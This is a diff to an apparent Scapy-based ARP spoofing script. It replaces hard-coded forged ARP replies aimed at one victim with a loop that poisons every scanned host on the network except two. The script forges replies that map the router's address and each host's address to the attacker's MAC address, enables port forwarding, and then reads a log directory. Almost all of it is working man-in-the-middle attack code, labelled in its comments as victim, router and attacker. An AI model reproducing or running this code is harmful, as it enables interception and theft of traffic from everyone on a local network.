@@ -174,17 +174,6 @@ if __name__ == "__main__":
     for i in range(0,len(ip)):
         print("%-18s       %s" % (ip[i],mac[i]))
 
-    victimpacket = ARP( op=2, 
-                        pdst="10.0.2.8", 
-                        hwdst="08:00:27:34:C8:8F",
-                        psrc="10.0.2.1", 
-                        hwsrc="08:00:27:25:A4:94")
-    routerpacket = ARP( op=2, 
-                        pdst="10.0.2.1", 
-                        hwdst="38:6B:1C:C3:8C:68",
-                        psrc="10.0.2.8", 
-                        hwsrc="08:00:27:25:A4:94")
-
     enable_port_forwarding()
 
     try:
@@ -192,8 +181,22 @@ if __name__ == "__main__":
             # verbose=0 : make the function totally silent
             # More : help(send)
             # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
-            send(victimpacket, verbose=0)
-            send(routerpacket, verbose=0)
+
+            for j in range(0,len(ip)):
+                if(ip[j]!="10.0.0.2" and ip[j]!="10.0.0.3"):
+                    print("Send from: ",ip[j]," ",mac[j]),
+                    victimpacket = ARP(op=2,
+                                    pdst = ip[j],               # victim's IP
+                                    hwdst= mac[j],              # victim's MAC 
+                                    psrc = routerIp,            # router's IP
+                                    hwsrc=hostmac)  # attacker's MAC
+                    routerpacket = ARP(op=2,
+                                    pdst =  routerIp,
+                                    hwdst= routerMac,
+                                    psrc = ip[j],
+                                    hwsrc=hostmac)
+                    send(victimpacket, verbose=0)
+                    send(routerpacket, verbose=0)
 
             print("GOGOGO")
             for file in os.listdir("logdir/"):
